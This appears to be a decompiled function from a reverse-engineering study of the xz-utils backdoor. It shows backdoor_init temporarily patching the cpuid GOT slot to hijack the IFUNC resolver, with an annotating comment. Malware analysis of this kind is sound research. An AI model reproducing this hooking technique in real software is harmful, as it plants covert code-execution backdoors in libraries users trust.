// /home/kali/xzre-ghidra/xzregh/10A794_backdoor_init.c
// Function: backdoor_init @ 0x10A794
// Calling convention: unknown
// Prototype: undefined backdoor_init(void)


/*
 * AutoDoc: Converts the IFUNC entry context into a GOT patch: it initialises the GOT bookkeeping, locates
 * the cpuid GOT slot via `update_got_address`, swaps the resolver pointer to
 * `backdoor_init_stage2`, calls the genuine cpuid to finish initialisation, and then restores the
 * slot back to its original target so future calls run the attacker’s resolver without tripping
 * sanity checks.
 */
#include "xzre_types.h"


void backdoor_init(long *param_1)

{
  long lVar1;
  undefined *puVar2;
  long lVar3;
  long *plVar4;
  long *got_slot;
  void *plt_entry;
  long jump_flags;
  
  param_1[4] = (long)param_1;
  init_elf_entry_ctx();
  puVar2 = PTR__Llzma_block_buffer_decode_0_0010e000;
  param_1[5] = param_1[2];
  lVar3 = *param_1 - param_1[4];
  param_1[1] = lVar3;
  plVar4 = (long *)(lVar3 + *(long *)(puVar2 + 8));
  param_1[2] = (long)plVar4;
  if (plVar4 != (long *)0x0) {
    lVar1 = *plVar4;
    *plVar4 = lVar3 + *(long *)(puVar2 + 0x10);
    (*(code *)PTR__cpuid_gcc_0010e008)();
    *plVar4 = lVar1;
  }
  return;
}

